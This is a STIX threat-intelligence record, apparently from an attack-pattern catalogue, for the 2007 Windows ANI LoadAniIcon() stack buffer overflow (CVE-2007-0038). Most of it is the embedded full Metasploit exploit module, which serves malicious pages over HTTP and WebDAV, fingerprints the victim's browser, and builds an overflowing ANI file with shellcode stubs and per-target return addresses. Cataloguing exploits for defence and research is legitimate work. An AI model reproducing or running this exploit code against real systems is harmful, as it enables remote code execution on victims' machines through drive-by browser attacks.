{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9416dbd8-e685-4db7-bb0a-623a1452a98f",
    "created": "2024-08-14T16:42:35.430297Z",
    "modified": "2024-08-14T16:42:35.430301Z",
    "name": "Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)",
    "description": " This module exploits a buffer overflow vulnerability in the LoadAniIcon() function in USER32.dll. The flaw can be triggered through Internet Explorer 6 and 7 by using the CURSOR style sheet directive to load a malicious .ANI file. The module can also exploit Mozilla",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms07_017_ani_loadimage_chunksize.rb",
            "external_id": "ms07_017_ani_loadimage_chunksize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0038"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RIFF\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)',\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability in the\n        LoadAniIcon() function in USER32.dll. The flaw can be triggered through\n        Internet Explorer 6 and 7 by using the CURSOR style sheet directive\n        to load a malicious .ANI file. The module can also exploit Mozilla\n        Firefox by using a UNC path in a moz-icon URL and serving the .ANI file\n        over WebDAV. The vulnerable code in USER32.dll will catch any\n        exceptions that occur while the invalid cursor is loaded, causing the\n        exploit to silently fail when the wrong target has been chosen.\n\n        This vulnerability was discovered by Alexander Sotirov of Determina\n        and was rediscovered, in the wild, by McAfee.\n      },\n\n      'Author'         =>\n        [\n          'hdm',   # First version\n          'skape', # Vista support\n\n          # Firefox support, OS language independence, improved reliability\n          'Solar Eclipse <solareclipse[at]phreedom.org>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-0038'],\n          ['OSVDB', '33629'],\n          ['BID', '23194'],\n          ['MSB', 'MS07-017']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'  => 1024 + (rand(1000)),\n          'Compat' =>\n          {\n            'ConnectionType' => '-find',\n          }\n        },\n      'Platform'       => 'win',\n\n      # Automatic target tested on:\n      #\n      #   Windows NT SP6 + IE6 SP1\n      #   Windows 2000 SP4 + IE6 SP1\n      #   Windows 2000 SP4 UR1 + IE6 SP1\n      #   Windows XP SP0\n      #   Windows XP SP1\n      #   Windows XP SP2\n      #   Windows XP SP2 + IE7\n      #   Windows 2003 SP0\n      #   Windows 2003 SP1\n      #   Windows 2003 SP1 + IE7\n      #   Windows Vista\n      #\n      #   Windows XP SP0 + Firebird 0.7\n      #   Windows XP SP0 + Firefox 1.0\n      #   Windows XP SP0 + Firefox 1.5\n      #   Windows XP SP2 + Firefox 2.0\n      #   Windows 2003 SP1 + Firefox 2.0\n      #   Windows Vista + Firefox 2.0\n\n      'Targets'        =>\n        [\n          [ '(Automatic) IE6, IE7 and Firefox on Windows NT, 2000, XP, 2003 and Vista',\n            {\n            'Method' => 'automatic'\n            }\n          ],\n          [ 'IE6 on Windows NT, 2000, XP, 2003 (all languages)',\n            {\n            'Method' => 'jmpesp',\n            'Ret1'   => 0x0040afff,   # jmp esp on NT, 2000, XP, 2003 SP0 (iexplore.exe)\n            'Ret2'   => 0x004090df    # jmp esp on 2003 SP1, SP2 (iexplore.exe)\n            }\n          ],\n          [ 'IE7 on Windows XP SP2, 2003 SP1, SP2 (all languages)',\n            {\n            'Method' => 'jmpesp',\n            'Ret1'   => 0x00420B45,   # jmp esp on XP SP2 (iexplore.exe)\n            'Ret2'   => 0x00420B45    # jmp esp on 2003 SP1, SP2 (iexplore.exe)\n            }\n          ],\n          [ 'IE7 and Firefox on Windows Vista (all languages)',\n            {\n            'Method' => 'partial',\n            'Ret'    => 0x700B        # we change user32.dll+5879 to user32.dll+700B (jmp [ebx] in user32.dll)\n            }\n          ],\n          [ 'Firefox on Windows XP (English)',\n            {\n            'Method' => 'jmpesp',\n            'Ret1'   => 0x77059E48,   # jmp esp on XP (comres.dll)\n            'Ret2'   => 0x77019668    # jmp esp on 2003 SP1, SP2 (comres.dll)\n            }\n          ],\n          [ 'Firefox on Windows 2003 (English)',\n            {\n            'Method' => 'jmpesp',\n            'Ret1'   => 0x77019668,   # jmp esp on 2003 SP0 (comres.dll)\n            'Ret2'   => 0x77019668    # jmp esp on 2003 SP1, SP2 (comres.dll)\n            }\n          ],\n        ],\n      'DisclosureDate' => '2007-03-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The daemon port to listen on\", 80 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n\n#\n# Handle HTTP requests\n#\n\n  def on_request_uri(cli, request)\n\n    #\n    # Automatic browser and OS detection\n    #\n\n    print_status(\"Attempting to exploit ani_loadimage_chunksize\")\n    browser = ''\n\n    if target['Method'] == 'automatic'\n\n      agent = request.headers['User-Agent']\n\n      # Check for Firefox requests\n\n      if agent =~ /(Gecko|Microsoft-WebDAV-MiniRedir)/\n\n        browser = 'Mozilla'\n\n        # WebDAV requires that we use port 80 and the URIPATH is '/'\n\n        if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n          print_status(\"Request received from Mozilla. To exploit Mozilla browsers, SRVPORT must be set to 80 and URIPATH must be '/'\")\n          cli.send_response(create_response(404, \"File not found\"))\n          return\n        end\n\n        if agent =~ /(Windows NT 6\\.0|MiniRedir\\/6\\.0)/\n          target = targets[3]   # Firefox on Vista\n        elsif agent =~ /(Windows NT 5\\.1|MiniRedir\\/5\\.1)/\n          target = targets[4]   # Firefox on XP\n        elsif agent =~ /(Windows NT 5\\.2|MiniRedir\\/5\\.2)/\n          target = targets[5]   # Firefox on 2003\n        else\n          print_status(\"Unknown User-Agent #{agent}\")\n          return\n        end\n\n      # Check for MSIE requests\n\n      elsif agent =~ /MSIE/\n\n        browser = 'IE'\n\n        if agent =~ /Windows NT 6\\.0/\n          target = targets[3]   # IE7 on Vista\n        elsif agent =~ /MSIE 7\\.0/\n          target = targets[2]   # IE7 on XP and 2003\n        elsif agent =~ /MSIE 6\\.0/\n          target = targets[1]   # IE6 on NT, 2000, XP and 2003\n        else\n          print_status(\"Unknown User-Agent #{agent}\")\n          return\n        end\n\n      # Unknown user agent\n\n      else\n        print_status(\"Unknown User-Agent #{agent}\")\n        return\n      end\n\n    end\n\n    #\n    # Find out if this is a request for an ANI file\n    #\n\n    # Mozilla always uses a .ani extension, but IE randomly picks one of the\n    # other extensions for the ANI request\n    exts = ['bmp', 'wav', 'png', 'zip', 'tar', 'ani']\n\n    ani_request = false\n\n    match = /\\.(...)$/.match(request.uri)\n\n    if match and exts.include?(match[1])\n      ani_request = true\n    end\n\n    #\n    # OPTIONS and PROPFIND requests sent by the WebDav Mini-Redirector\n    #\n\n    if request.method == 'OPTIONS'\n      print_status(\"Received WebDAV OPTIONS request\")\n      headers = {\n        'DASL'   => '<DAV:sql>',\n        'DAV'    => '1, 2',\n        'Public' => 'OPTIONS, GET, PROPFIND',\n        'Allow'  => 'OPTIONS, GET, PROPFIND'\n      }\n      send_response(cli, '', headers)\n      return\n    end\n\n    if request.method == 'PROPFIND'\n      print_status(\"Received WebDAV PROPFIND request\")\n\n      body = ''\n\n      if (not ani_request)\n        # Response for directories\n        body = '<?xml version=\"1.0\"?><a:multistatus xmlns:a=\"DAV:\"><a:response><a:propstat><a:prop><a:resourcetype><a:collection/></a:resourcetype></a:prop></a:propstat></a:response></a:multistatus>'\n      else\n        # Response for files\n        body = '<?xml version=\"1.0\"?><a:multistatus xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\" xmlns:c=\"xml:\" xmlns:a=\"DAV:\"><a:response></a:response></a:multistatus>'\n      end\n\n      send_response(cli, body, {'Content-Type' => 'text/xml'})\n      return\n    end\n\n    #\n    # HTML requests sent by IE and Firefox\n    #\n\n    if (not ani_request)\n\n      # Pick a random extension to use when we generate HTML. The moz-icon URL\n      # must have a .ani extension, but we can use a random one for IE\n\n      exts.delete('ani')\n      ext = exts[rand(exts.length)]\n\n      # Generate the HTML\n\n      html =\n        \"<html>\" +\n        \"<head><title>\" + random_padding + \"</title></head>\" +\n        \"<body>\" +\n        random_padding +\n        (browser == 'IE' ? generate_ie_html(ext) : generate_mozilla_html) +\n        random_padding +\n        \"</body>\" +\n        \"</html>\"\n\n      print_status(\"Sending HTML page\")\n\n      send_response(cli, html)\n      return\n    end\n\n    #\n    # ANI requests sent by IE and the WebDav Mini-Redirector\n    #\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the compressed response to the client\n    send_response(cli, generate_ani(p, target), { 'Content-Type' => 'application/octet-stream' })\n  end\n\n\n  #\n  # Generate a <div> element with a style attribute referencing the ANI file\n  #\n\n  def generate_ie_html(ext)\n    path = get_resource.sub(/\\/$/, '')\n\n    \"<div style='\" +\n    random_css_padding +\n    Rex::Text.to_rand_case(\"cursor\") +\n    random_css_padding +\n    \":\" +\n    random_css_padding +\n    Rex::Text.to_rand_case(\"url(\") +\n    random_css_padding +\n    '\"' +\n    path + '/' + rand_text_alphanumeric(rand(80)+16) + '.' + ext +\n    '\"' +\n    random_css_padding +\n    \");\" +\n    random_css_padding +\n    \"'>\" +\n    random_padding +\n    \"</div>\"\n  end\n\n\n  #\n  # Generate a img tag with a moz-icon URL referencing the ANI file\n  #\n\n  def generate_mozilla_html\n    path = get_resource.gsub(/\\/$/, '')\n\n    # The UNC path of the ANI file must have at least one directory level,\n    # otherwise the WebDAV redirector will not work\n    if path == ''\n    path = '/' + rand_text_alphanumeric(rand(80)+16)\n    end\n\n    return '<img src=\"moz-icon:file://///' +\n    datastore['SRVHOST'] +\n    path + '/' + rand_text_alphanumeric(rand(80)+16) + '.ani\">'\n  end\n\n\n  #\n  # Generate CSS padding\n  #\n\n  def random_css_padding\n    buf =\n    random_whitespace +\n    \"/*\" +\n    random_whitespace +\n    random_padding +\n    random_whitespace +\n    \"*/\" +\n    random_whitespace\n  end\n\n\n  #\n  # Generate random whitespace\n  #\n\n  def random_whitespace\n    len = rand(100)+2\n    set = \"\\x09\\x20\\x0d\\x0a\"\n    buf = ''\n\n    while (buf.length < len)\n    buf << set[rand(set.length)].chr\n    end\n    buf\n  end\n\n\n  #\n  # Generate random padding\n  #\n\n  def random_padding\n    rand_text_alphanumeric(rand(128)+4)\n  end\n\n\n  #\n  # Generate an ANI file that will trigger the vulnerability\n  #\n\n  def generate_ani(payload, target)\n\n    # Valid ANI header\n\n    header = [\n      36,     # cbSizeOf (must be 36)\n      rand(128)+16, # cFrames (must be > 1 and < 0x10000)\n      rand(1024)+1, # cSteps (must be < 0x10000)\n      0, 0,   # cx, cy\n      0,      # cBitCount\n      0,      # cPlanes\n      0,      # JifRate\n      1       # Flags (must have the LSB bit set)\n    ].pack('V9')\n\n    overflow = ''\n\n    if target['Method'] == 'jmpesp'\n\n    # ANI header that triggers the overflow:\n    overflow =\n      # 36 bytes of fake header\n\n      # When we get control, the ebx and esi registers have the following values:\n      #\n      # 2000, XP, 2003 before MS05-002\n      #     ebx = 0, esi = pointer to MappedFile struct\n      #\n      # NT before MS05-002\n      #     ebx = pointer to dword 1, esi = pointer to MappedFile struct\n      #\n      # all versions after MS05-002, including XP SP2 and 2003 SP1\n      #     ebx = pointer to MappedFile struct\n      #\n      # The first field in MappedFile is a pointer to the ANI file\n\n      \"\\x85\\xDB\" +                  # test ebx,ebx\n      \"\\x74\\x0A\" +                  # jz jmp_esi            2000, XP, 2003 before MS05-002\n      \"\\x81\\x3B\\x01\\x00\\x00\\x00\" +  # cmp dword [ebx], 0x1\n      \"\\x74\\x02\" +                  # jz jmp_esi            NT before MS05-002\n      \"\\x89\\xDE\" +                  # mov esi, ebx          all versions after MS05-002\n    # jmp_esi:\n      \"\\x8B\\x36\" +                  # mov esi,[esi]         pointer to ANI file\n      \"\\x81\\x3E\\x52\\x49\\x46\\x46\" +  # cmp [esi], 'RIFF'\n      \"\\x75\\x02\" +                  # jnz failed\n      \"\\xFF\\xE6\" +                  # jmp esi\n    # failed:\n      \"\\x31\\xc0\" +                  # xor eax, eax\n      \"\\x8b\\x00\" +                  # mov eax, [0]          exit via SEH\n      rand_text(2) +\n      \"\\x00\\x00\\x00\\x00\" +    # header flags (LSB bit must be set to 0)\n\n      # end of header\n\n      rand_text(4*6) +        # local variables\n\n      # The following local variables must be NULL to avoid calls to\n      # HeapFree and NtUserDestroyCursor\n\n                  # 2000, XP, 2003 SP0    2003 SP1\n\n      \"\\x00\\x00\\x00\\x00\" +    # var_10\n      \"\\x00\\x00\\x00\\x00\" +    # var_C\n      \"\\x00\\x00\\x00\\x00\" +    #                       var_C\n      \"\\x00\\x00\\x00\\x00\" +    #                       var_8\n      \"\\x00\\x00\\x00\\x00\" +    #                       var_4\n\n      [\n        target['Ret1'],     # return address for NT, 2000, XP and 2003 SP0\n        target['Ret2']      # return address for 2003 SP1\n      ].pack('VV') +\n\n      rand_text(4*4) +        # function arguments\n\n      \"\\x90\\x90\\x90\\x90\" +    # jmp esp on NT, 2000, XP and 2003 SP0 lands\n                  # here, 2003 SP1 lands on the next dword\n\n      \"\\xeb\\x92\"              # jump back to the shellcode in the ANI header\n\n    elsif target['Method'] == 'partial'\n\n    # ANI header that triggers the overflow:\n\n    overflow =\n\n      # 36 bytes of fake header\n\n      rand_text(32) +\n      \"\\x00\\x00\\x00\\x00\" +    # header flags (LSB bit must be set to 0)\n\n      # end of header\n\n      rand_text(4*8) +        # local variables\n\n      # The following local variables must be NULL to avoid calls to\n      # HeapFree and NtUserDestroyCursor on Vista\n\n      \"\\x00\\x00\\x00\\x00\" +    # var_C\n      \"\\x00\\x00\\x00\\x00\" +    # var_8\n      \"\\x00\\x00\\x00\\x00\" +    # var_4\n\n      rand_text(4) +          # saved ebp\n\n      [\n        target['Ret'],      # 2 byte partial overwrite of the return address\n      ].pack('v')\n\n    else\n      fail_with(Failure::NoTarget, \"Unknown target #{target['Method']}\")\n    end\n\n    # Build the ANI file\n\n    # The shellcode execution begins at the RIFF signature:\n    #\n    #   'R' 52      push edx\n    #   'I' 49      dec ecx\n    #   'F' 46      inc esi\n    #   'F' 46      inc esi\n    #       eb 3a   jmp +3a     # jmp to the code in the payload chunk\n    ani =\n    \"RIFF\" + \"\\xeb\\x3a\\x00\\x00\" +\n      \"ACON\" +\n      riff_chunk(\"anih\", header) +\n\n      # payload chunk\n      riff_chunk(random_riff_tag,\n      Rex::Arch::X86.copy_to_stack(payload.encoded.length) +\n      payload.encoded) +\n\n      random_riff_chunks +\n\n      # the second anih chunk trigger the overflow\n      riff_chunk(\"anih\", overflow) +\n\n      random_riff_chunks\n\n    return ani\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2007-03-28",
    "x_mitre_platforms": [
        "win'"
    ]
}